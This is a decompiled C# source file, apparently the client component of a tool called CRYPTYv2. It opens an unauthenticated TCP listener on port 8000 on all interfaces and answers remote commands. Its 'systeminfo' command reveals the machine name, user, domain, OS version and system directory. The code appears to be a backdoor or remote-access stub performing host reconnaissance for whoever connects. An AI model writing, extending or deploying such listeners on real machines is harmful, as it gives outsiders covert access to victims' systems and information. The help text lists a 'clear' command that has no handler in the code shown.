using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace CRYPTYv2_Client;

[StandardModule]
internal sealed class TCP_Connector
{
	private static NetworkStream stream;

	private static StreamWriter streamw;

	private static StreamReader streamr;

	private static TcpListener server;

	private static TcpClient client = new TcpClient();

	private static bool serveronline;

	private static IPEndPoint ipendpoint = new IPEndPoint(IPAddress.Any, 8000);

	private static Thread t = new Thread(Main);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Main()
	{
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			server = new TcpListener(ipendpoint);
			server.Start();
			client = server.AcceptTcpClient();
			stream = client.GetStream();
			streamr = new StreamReader(stream);
			streamw = new StreamWriter(stream);
			serveronline = true;
			while (true)
			{
				string text = streamr.ReadLine();
				if (Operators.CompareString(text, "systeminfo", false) == 0)
				{
					Send("==========> Systeminfo <==========");
					Send("|| MachineName: " + Environment.MachineName);
					Send("|| User: " + Environment.UserName);
					Send("|| User Domain Name: " + Environment.UserDomainName);
					Send("|| OS-Version: " + Environment.OSVersion.ToString());
					Send("|| System Directory: " + Environment.SystemDirectory);
					Send("==================================");
				}
				else if (Operators.CompareString(text, "help", false) != 0)
				{
					Send("Unknown command. Please try again!");
				}
				else
				{
					Send("==========> Help <==========");
					Send("help ==> Show this help");
					Send("clear ==> Clears the console");
					Send("systeminfo ==> Show system information");
					Send("==================================");
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			MessageBox.Show("Socket-Fehler.");
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
	}

	public static object ServerActive()
	{
		if (serveronline)
		{
			return true;
		}
		return false;
	}

	public static void Send(string stext)
	{
		streamw.WriteLine(stext);
		streamw.Flush();
	}

	public static object startConnection()
	{
		t.Start();
		return "";
	}

	public static object closeConnection()
	{
		client.Close();
		streamr.Close();
		streamw.Close();
		stream.Close();
		server.Stop();
		t.Abort();
		serveronline = false;
		return "";
	}
}
